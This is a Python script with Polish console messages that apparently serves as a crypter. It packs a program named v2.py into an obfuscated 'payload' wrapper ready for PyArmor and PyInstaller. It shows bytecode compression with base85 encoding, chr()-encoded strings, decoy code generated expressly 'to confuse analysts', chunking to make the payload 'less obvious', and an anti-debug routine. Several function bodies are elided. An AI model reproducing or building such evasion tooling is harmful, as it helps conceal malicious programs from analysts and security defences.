#!/usr/bin/env python3
"""
Generator zobfuskowanego kodu v2.py
Tworzy wielowarstwowo zakodowany plik gotowy do PyArmor + PyInstaller
"""
import base64, zlib, marshal, sys, os, random, string
...
def encode_string(s):
    """Encode string as chr() concatenation"""
    return ' + '.join(f'chr({ord(c)})' for c in s)

def obfuscate_source(source_code):
    """
    Manual obfuscation of the source code:
    - Encode all string literals
    - Rename identifiable function/variable names
    - Add junk variables
    """
    # Compile to bytecode
    ...
    # Encode with base85 (more compact than base64)
    encoded = base64.b85encode(compressed)

    return encoded.decode('ascii')

def generate_decoy_code():
    """Generate realistic-looking decoy code to confuse analysts"""
    decoys = []

    # Fake network-related code
    decoys.append(f"""
class {random_name(10)}:
    ...
    def {random_name(8)}(self, {random_name(4)}, {random_name(4)}=0):
        return {random_name(4)} ^ {random.randint(0, 0xFFFFFFFF)}
""")

    # Fake crypto-looking operations
    decoys.append(f"""
_{random_name(8)} = [
...
def build_wrapper(encoded_payload):
    """Build the final obfuscated wrapper"""

    # Split payload into chunks to make it less obvious
    chunk_size = 76
    chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]

    # Generate random variable names for chunks
    ...
    # Anti-debug function with obfuscated name
...
def main():
    source_path = os.path.join(os.path.dirname(__file__), '..', 'v2.py')
    ...
    print("[*] Kompilacja i kodowanie payloadu...")
    ...
    output_path = os.path.join(os.path.dirname(__file__), 'v2_final.py')
    with open(output_path, 'w') as f:
        f.write(wrapper)

    print(f"[+] Zapisano zobfuskowany plik: {output_path}")
    print(f"[*] Rozmiar: {os.path.getsize(output_path)} bajtow")
    print("[*] Nastepny krok: pyarmor gen v2_final.py, potem pyinstaller")
